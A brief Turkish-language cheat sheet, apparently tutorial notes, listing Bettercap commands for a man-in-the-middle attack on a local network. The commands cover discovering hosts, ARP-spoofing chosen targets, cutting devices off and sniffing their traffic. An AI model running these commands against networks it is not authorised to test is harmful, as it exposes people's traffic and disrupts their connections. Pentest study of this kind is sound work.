# Bettercap ile MITM Saldırısı 

* ```bettercap -iface eth0``` 

 !! bettercap çalıştırdıktan sonra ```help``` yazarsak içinde nelerin çalıştığını görebiliriz
 
* ```net.prope on``` Ağdaki cihazların IP adresini, MAC adreslerini ve cihaz isimlerini gösterir
* ```net.show``` Toplanan bilgileri özet olarak gösterir
### Bettercap İçinde
* ```arp.ban on``` hedef PC'ye deauth saldırısı yapar
* ```arp.spoof.fullduplex``` Hem modeme hem PC'ye MITM saldırısı yapar
* ```arp.spoof.internal``` True olursa, PC'ler arasındaki bağlantıları gösterir
* ```arp.spoof.skip_restore``` True olursa, Saldırı sonrası doğru verileri göndermez
* ```arp.spoof.targets 192.168.123.123``` "," koyarak birden fazla PC'ye MITM saldırısı yapabiliriz
* ```arp.spoof.whitelist``` Belirtilen IP adreslerine sahip cihazlara saldırı yapmaz

Parametreleri değiştirmek için: ```set``` komutunu kullanıyoruz. ```(e.g. arp.spoof.fullduplex true)``` 

# Bettercap ile Dinleme Yapma

* ```net.sniff on``` Hedef PC'yi dinlemeye başlar
